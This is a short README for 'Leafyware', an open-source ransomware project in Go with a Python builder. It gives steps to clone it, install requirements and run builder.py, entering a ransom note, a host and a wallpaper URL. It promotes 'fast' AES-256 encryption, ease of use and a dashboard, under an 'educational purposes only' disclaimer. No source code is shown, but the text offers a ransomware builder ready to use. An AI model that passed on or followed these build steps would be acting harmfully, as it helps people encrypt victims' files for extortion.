# LeafyWare
Leafyware-ransomware

[![Golang](https://img.shields.io/static/v1?label=Golang&message=%20&color=orange&logo=Go&style=flat-square&logoColor=white)](https://golang.org/)
[![Golang](https://img.shields.io/static/v1?label=Python&message=%20&color=orange&logo=python&style=flat-square&logoColor=white)](https://python.org/)

> This was made to demonstrate ransomware and how easy it is to make. I am not going to be responsible for anything use it for educational purposes only
### How to build
```python
    git clone https://github.com/ScRiPt1337/Leafyware-ransomware
    pip install -r requirements.txt
    cd Leafyware-ransomware
    cd Builder
    python3 builder.py
    Enter the Note and host and wallpaper Url
```

### Requirement

* python3
* Golang

### Feature
* Fast Encryption (AES-256 CTR MODE )
* Easy To use
* Open-source 
* Simple Dashboard

![Leafyware](https://github.com/ScRiPt1337/Leafyware-ransomware/raw/master/Capture.PNG)
its written in go 
